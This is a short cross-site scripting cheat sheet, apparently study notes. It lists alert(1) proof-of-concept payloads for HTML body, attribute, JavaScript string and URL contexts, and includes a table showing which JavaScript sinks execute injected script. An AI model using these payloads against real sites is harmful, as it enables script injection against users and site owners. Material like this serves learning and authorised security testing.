- `"><script>alert(1)</script>`

- `<img src=x onerror=alert(1)>`

- " autofocus onfocus=alert(1) x="

- `"><svg onload=alert(1)>` - when document.write() is used on <img> tag

|Sink used in JS|Script executes?|Payload style|
|---|---|---|
|`innerHTML`|✅|`<img onerror=alert(1)>`|
|`document.write()`|✅|`<script>alert(1)</script>`|
|`location.href`|✅|`javascript:alert(1)`|
|`eval()`|✅|`alert(1)`|
|`setTimeout(userInput)`|✅|`alert(1)`|
|`innerText`|❌|❌ No HTML XSS|

|**Context**|**Where Input Appears**|**Why Vulnerable**|**Working Payload Example**|**Notes / Memory Hook**|
|---|---|---|---|---|
|🔴 **HTML Body Context**|`<div>USER_INPUT</div>`|Browser parses HTML tags|`<script>alert(1)</script>`|Full HTML parsing happens|
||||`<img src=x onerror=alert(1)>`|Event attributes auto-execute|
|🔵 **HTML Attribute Context**|`<input value="USER_INPUT">`|Can break out of attribute|`" autofocus onfocus=alert(1) x="`|Close quote → inject attribute|
||||`" onmouseover=alert(1) x="`|Useful when user interaction exists|
|🟡 **JavaScript String Context**|`let x = "USER_INPUT";`|JS interpreter executes string breaks|`";alert(1);//`|Close string → inject JS|
||||`'+alert(1)+'`|Alternate concatenation technique|
|🟣 **URL / Location Context**|`location.href = USER_INPUT;`|Browser accepts JS URLs|`javascript:alert(1)`|Works only if unfiltered|
||||`data:text/html,<script>alert(1)</script>`|Useful if `javascript:` blocked|